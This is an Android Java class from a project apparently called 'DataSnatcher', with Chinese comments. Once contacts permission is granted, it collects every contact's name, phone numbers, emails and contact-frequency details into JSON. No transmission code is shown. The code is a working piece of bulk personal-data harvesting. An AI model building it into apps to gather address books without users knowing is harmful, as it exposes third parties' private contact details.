package com.example.DataSnatcher.collector.ContactInfo;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.util.Log;

import androidx.core.content.ContextCompat;

import com.example.DataSnatcher.collector.IInfoCollector;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class ContactInfoCollector implements IInfoCollector {
    private static final String TAG = "ContactInfoCollector";
    private final Context context;

    // 所需权限
    private static final String[] REQUIRED_PERMISSIONS = {
            Manifest.permission.READ_CONTACTS
    };

    public ContactInfoCollector(Context context) {
        if (context == null) {
            throw new IllegalArgumentException("Context 不能为 null");
        }
        this.context = context.getApplicationContext();
    }

    @Override
    public String getCategory() {
        return "联系人信息";
    }

    @Override
    public JSONObject collect() {
        JSONObject contactInfo = new JSONObject();
        JSONArray contactsArray = new JSONArray();

        // 检查权限
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS)
                != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "没有读取联系人权限");
            try {
                contactInfo.put("error", "没有读取联系人权限");
            } catch (JSONException e) {
                Log.e(TAG, "JSON异常 (添加错误信息)", e); // 区分日志
            }
            return contactInfo;
        }

        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = null;
        Cursor phoneCursor = null;
        Cursor emailCursor = null;

        try {
            // 查询所有联系人
            // 建议明确指定要查询的列，这样可以提高效率并避免查询到不期望或不存在的列。
            // 但为了兼容性，保留 null projection 并进行 -1 检查也是一种方法。
            String[] projection = new String[]{
                    ContactsContract.Contacts._ID,
                    ContactsContract.Contacts.DISPLAY_NAME,
                    ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP,
                    ContactsContract.Contacts.LAST_TIME_CONTACTED,
                    ContactsContract.Contacts.TIMES_CONTACTED,
                    ContactsContract.Contacts.STARRED
            };
            cursor = contentResolver.query(
                    ContactsContract.Contacts.CONTENT_URI,
                    projection, // 使用明确的 projection
                    null,
                    null,
                    null
            );

            if (cursor != null) {
                // 获取列索引，并检查是否存在
                int idIndex = cursor.getColumnIndex(ContactsContract.Contacts._ID);
                int displayNameIndex = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
                int lastUpdatedIndex = cursor.getColumnIndex(ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP);
                int lastTimeContactedIndex = cursor.getColumnIndex(ContactsContract.Contacts.LAST_TIME_CONTACTED);
                int timesContactedIndex = cursor.getColumnIndex(ContactsContract.Contacts.TIMES_CONTACTED);
                int starredIndex = cursor.getColumnIndex(ContactsContract.Contacts.STARRED);


                // 检查必要列是否存在
                if (idIndex == -1 || displayNameIndex == -1) {
                    Log.e(TAG, "Contacts cursor is missing essential columns (_ID or DISPLAY_NAME). Cannot proceed.");
                    try {
                        contactInfo.put("error", "Missing essential contact columns (_ID or DISPLAY_NAME).");
                    } catch (JSONException e) {
                        Log.e(TAG, "JSON异常 (添加缺失列错误信息)", e);
                    }
                    return contactInfo; // 必要列缺失，直接返回
                }


                while (cursor.moveToNext()) {
                    // 对于必要列，直接获取（前面已检查存在性）
                    String contactId = cursor.getString(idIndex);
                    String displayName = cursor.getString(displayNameIndex);


                    JSONObject contact = new JSONObject();
                    contact.put("display_name", displayName);

                    // 获取电话号码
                    JSONArray phoneNumbers = new JSONArray();
                    // 建议只查询 NUMBER 列
                    String[] phoneProjection = new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER};
                    phoneCursor = contentResolver.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            phoneProjection, // 使用明确的 projection
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{contactId},
                            null
                    );

                    if (phoneCursor != null) {
                        int phoneNumberIndex = phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                        if (phoneNumberIndex != -1) { // 检查电话号码列是否存在
                            while (phoneCursor.moveToNext()) {
                                String phoneNumber = phoneCursor.getString(phoneNumberIndex);
                                phoneNumbers.put(phoneNumber);
                            }
                        } else {
                            Log.w(TAG, "Column NUMBER not found in phone cursor for contactId: " + contactId);
                        }
                        phoneCursor.close(); // 及时关闭内层 Cursor
                        phoneCursor = null; // 置为 null，防止finally块重复关闭
                    }
                    contact.put("phone_numbers", phoneNumbers);

                    // 获取邮箱
                    JSONArray emails = new JSONArray();
                    // 建议只查询 DATA 列
                    String[] emailProjection = new String[]{ContactsContract.CommonDataKinds.Email.DATA};
                    emailCursor = contentResolver.query(
                            ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                            emailProjection, // 使用明确的 projection
                            ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                            new String[]{contactId},
                            null
                    );

                    if (emailCursor != null) {
                        int emailIndex = emailCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA);
                        if (emailIndex != -1) { // 检查邮箱列是否存在
                            while (emailCursor.moveToNext()) {
                                String email = emailCursor.getString(emailIndex);
                                emails.put(email);
                            }
                        } else {
                            Log.w(TAG, "Column DATA not found in email cursor for contactId: " + contactId);
                        }
                        emailCursor.close(); // 及时关闭内层 Cursor
                        emailCursor = null; // 置为 null
                    }
                    contact.put("emails", emails);

                    // 获取其他信息，需要检查索引是否存在
                    if (lastUpdatedIndex != -1) {
                        contact.put("last_updated", cursor.getLong(lastUpdatedIndex));
                    } else {
                        Log.w(TAG, "Column CONTACT_LAST_UPDATED_TIMESTAMP not found for contactId: " + contactId);
                        // contact.put("last_updated", JSONObject.NULL); // 可选：明确放入null
                    }

                    if (lastTimeContactedIndex != -1) {
                        contact.put("last_time_contacted", cursor.getLong(lastTimeContactedIndex));
                    } else {
                        Log.w(TAG, "Column LAST_TIME_CONTACTED not found for contactId: " + contactId);
                    }

                    if (timesContactedIndex != -1) {
                        contact.put("times_contacted", cursor.getInt(timesContactedIndex));
                    } else {
                        Log.w(TAG, "Column TIMES_CONTACTED not found for contactId: " + contactId);
                    }

                    if (starredIndex != -1) {
                        contact.put("starred", cursor.getInt(starredIndex));
                    } else {
                        Log.w(TAG, "Column STARRED not found for contactId: " + contactId);
                    }


                    contactsArray.put(contact);
                }
            }

            contactInfo.put("contacts", contactsArray);

        } catch (JSONException e) {
            Log.e(TAG, "JSON处理异常", e);
            try {
                contactInfo.put("error", "JSON处理异常: " + e.getMessage());
            } catch (JSONException ex) {
                Log.e(TAG, "无法添加错误信息到JSON", ex);
            }
        } catch (Exception e) {
            Log.e(TAG, "获取联系人信息时发生异常", e);
            try {
                contactInfo.put("error", "获取联系人信息异常: " + e.getMessage());
            } catch (JSONException ex) {
                Log.e(TAG, "无法添加错误信息到JSON", ex);
            }
        } finally {
            // 确保所有 Cursor 都被关闭
            if (cursor != null && !cursor.isClosed()) {
                cursor.close();
            }
            // 内层 cursor 在循环内部已经关闭并置null，这里不再需要额外检查
            // if (phoneCursor != null && !phoneCursor.isClosed()) { // 这种检查在内层close后phoneCursor==null，不会进入
            //     phoneCursor.close();
            // }
            // if (emailCursor != null && !emailCursor.isClosed()) { // 同上
            //     emailCursor.close();
            // }
        }

        return contactInfo;
    }
}